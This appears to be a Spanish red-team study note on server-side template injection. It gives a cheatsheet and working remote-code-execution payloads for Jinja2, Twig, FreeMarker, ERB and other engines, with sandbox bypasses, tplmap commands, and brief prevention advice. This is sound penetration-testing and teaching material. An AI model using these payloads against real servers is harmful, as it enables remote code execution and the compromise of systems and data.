---
aliases:
  - SSTI
  - Template Injection
tags:
  - type/vulnerability
  - vuln/ssti
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: Vulnerability
linked:
---
# Server-Side Template Injection (SSTI)

***

## Cheatsheet por engine

| **Engine**              | **Lenguaje** | **Payload de detección**      | **RCE**                                                                                              |
| ----------------------- | ------------ | ----------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Jinja2 / Flask**      | Python       | `{{7*7}}` → `49`              | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`                   |
| **Twig (Symfony)**      | PHP          | `{{7*'7'}}` → `49`            | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`                  |
| **Smarty**              | PHP          | `{7*7}` → `49` (con `{`)      | `{system('id')}` (en Smarty v2) / `{Smarty_Internal_Write_File::writeFile(...)}` (v3)                |
| **FreeMarker**          | Java         | `${7*7}` → `49`               | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                                 |
| **Velocity**            | Java         | `#set($x=7*7)$x` → `49`       | `#set($e="exp") $e.getClass().forName("java.lang.Runtime").getMethod("exec",...).invoke(...)`        |
| **Thymeleaf**           | Java         | `${7*7}` no expande en todos contextos | `${T(java.lang.Runtime).getRuntime().exec('id')}` (en `th:text` server-side expression)        |
| **ERB (Ruby on Rails)** | Ruby         | `<%= 7*7 %>` → `49`           | `<%= \`id\` %>` o `<%= system("id") %>`                                                              |
| **Handlebars**          | JS (Node)    | `{{#with}}` trick             | Complejo — requiere prototype pollution o gadget específico.                                         |
| **Mako**                | Python       | `${7*7}` → `49`               | `<%= os.popen('id').read() %>`                                                                       |
| **Django**              | Python       | `{{7*7}}` NO expande          | SSTI en Django es raro; más común es [[Cross-Site Scripting (XSS)]] via `\|safe`.                   |

## Flujo de detección

```bash
# 1. Identificar engine con polyglot:
# Enviar: ${{<%[%'"}}%\
# Los errores en la response suelen filtrar el engine

# 2. Confirmar evaluación con expresión numérica
# Probar todos:
#   {{7*7}}         → Jinja2, Twig, Handlebars
#   ${7*7}          → FreeMarker, Velocity, Thymeleaf, Mako
#   <%= 7*7 %>      → ERB
#   #{7*7}          → Ruby on Rails legacy
#   {7*7}           → Smarty
#   @(7*7)          → Razor (.NET)

# 3. Escalar según engine detectado
```

## Explotación por engine

### Jinja2 (Flask / Python)

```python
# Enum de gadgets
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Identificar subprocess.Popen (suele ser index ~400, varía)
{{ ''.__class__.__mro__[1].__subclasses__()[400](['id'], stdout=-1).communicate() }}

# Variante compacta
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Si hay sandbox (config.from_object, etc)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Con filter bypass:
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (Symfony / PHP)

```twig
{# Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# Twig 2.x+ (sandbox bypass) #}
{{['id']|filter('system')}}
```

### FreeMarker (Java)

```html
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#-- Si Execute está bloqueado: -->
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"]).start()}
```

### ERB (Rails)

```erb
<%= IO.popen('id').read %>
<%= `id` %>
<%= system("id") %>
```

## Tools

```bash
# tplmap - herramienta automatizada
python tplmap.py -u "https://target/?name=test*"
python tplmap.py -u "https://target/search" -X POST -D "query=test*"

# Identifica engine, prueba payloads, escala a RCE
```

## Overview

**SSTI** ocurre cuando input del usuario se concatena directo en un template antes de ser renderizado por el engine, permitiendo ejecutar código en el **lenguaje del template** (no en el navegador como XSS).

El impacto suele ser **RCE directo** porque los templates server-side tienen acceso al runtime completo del lenguaje (objetos, clases, builtins).

### Vectores típicos

- Formularios de email con preview (newsletter builders).
- Renderizado de errores que interpola input (`Hello {{ username }}, page not found`).
- Sistemas de reporting que permiten templates custom.
- CMS con plantillas para usuarios.
- Markdown extendido con syntax template (raro pero existe).

### Prevención

- **Sandbox del template engine** — Jinja2 tiene `SandboxedEnvironment`, Twig tiene sandbox extension.
- **No concatenar** input en strings de template. Pasar como contexto: `render_template('page.html', name=user_input)` en vez de `render_template_string(f'Hello {user_input}')`.
- **Content-Security-Policy** no ayuda (SSTI es server-side, no client).
- Logica de negocio debe estar en código, no en templates.

## Notas relacionadas

- [[Insecure Deserialization]] — otro camino a RCE.
- [[XML External Entity (XXE)]] — patrón similar de abuso de parsers.
- [[OS Command Injection]] — meta-objetivo compartido.

***
